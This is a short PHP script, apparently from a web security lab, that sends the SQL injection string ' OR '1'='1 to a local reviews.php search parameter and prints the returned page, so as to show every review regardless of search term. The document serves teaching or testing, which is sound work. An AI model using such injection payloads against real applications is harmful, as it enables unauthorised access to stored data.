<?php
// Simulating malicious input that will show all reviews regardless of search term
$malicious_input = "' OR '1'='1";
$url = "http://localhost/lab1/src/reviews.php?search=" . urlencode($malicious_input);
$response = file_get_contents($url);
?>
<?php echo $response; ?>